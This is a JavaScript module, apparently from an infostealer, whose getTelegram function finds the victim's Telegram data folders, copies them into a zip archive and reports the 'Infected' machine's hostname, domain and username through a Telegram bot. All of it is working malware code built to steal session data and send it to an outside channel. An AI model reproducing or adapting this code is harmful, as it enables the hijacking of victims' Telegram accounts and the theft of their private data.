module.exports = (client) => {
    return {

        async getTelegram() {
            var description = "";

            client.utils.jsziptg.createFolder("\\Telegram");

            for (let [key, value] of Object.entries(client.config.telegram.directory)) {
                if (client.requires.fs.existsSync(value)) {
                    description += `${key}: ✔️\n`;
                    client.utils.jsziptg.copyFolder(`\\Telegram\\`, value);
                } else {
                    description += `${key}: ❌\n`;
                }
            }


            await client.utils.telebot.send2Message(`💉 Infected - ${client.utils.encryption.decryptData(client.config.user.hostname)}/${client.utils.encryption.decryptData(client.config.user.user_domain)}/${client.utils.encryption.decryptData(client.config.user.username)}\n**Telegram | Result**\n${description}`)
            
        }
    };
};